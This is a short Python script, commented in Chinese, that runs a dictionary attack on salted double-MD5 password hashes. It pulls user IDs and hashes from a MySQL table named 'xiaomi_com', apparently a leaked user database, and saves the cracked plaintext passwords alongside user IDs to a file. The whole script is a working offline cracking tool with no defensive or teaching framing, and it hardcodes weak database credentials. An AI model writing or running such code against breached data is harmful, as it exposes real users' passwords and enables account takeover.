import mysql.connector
import hashlib

# 数据库配置
config = {
    'user': 'root',
    'password': '123456',
    'host': 'localhost',
    'database': 'test',
    'raise_on_warnings': True,
}

# 常见弱口令列表
with open('processed_pass.txt', 'r') as file:
    common_passwords = [line.strip() for line in file.readlines()]

# 连接到数据库
cnx = mysql.connector.connect(**config)
cursor = cnx.cursor()

# SQL查询
query = "SELECT id, `password` FROM `xiaomi_com` WHERE id > 5131551 LIMIT 0,1000"

# 执行SQL查询
cursor.execute(query)

# 函数，用于尝试破解密码
def crack_passwords(db_passwords, weak_passwords):
    cracked_passwords = []

    for user_id, full_password in db_passwords:
        # 分割哈希和salt
        hashed_password, salt = full_password.split(':')
        for weak_pass in weak_passwords:
            # 生成弱口令的哈希
            hashed_weak_pass = hashlib.md5((hashlib.md5(weak_pass.encode('utf-8')).hexdigest() + salt).encode('utf-8')).hexdigest()
            
            # 比较哈希，看是否破解
            if hashed_weak_pass == hashed_password:
                print(f"UserID: {user_id} - Cracked password: {weak_pass}")
                cracked_passwords.append((user_id, weak_pass))
                break
                
    return cracked_passwords

# 获取所有密码记录
db_passwords = cursor.fetchall()

# 尝试破解密码
cracked = crack_passwords(db_passwords, common_passwords)

# 清理
cursor.close()
cnx.close()

# 如果你想将结果保存到文件中
with open('cracked_passwords.txt', 'w') as f:
    for user_id, weak_pass in cracked:
        f.write(f"UserID: {user_id} - Cracked password: {weak_pass}\n")
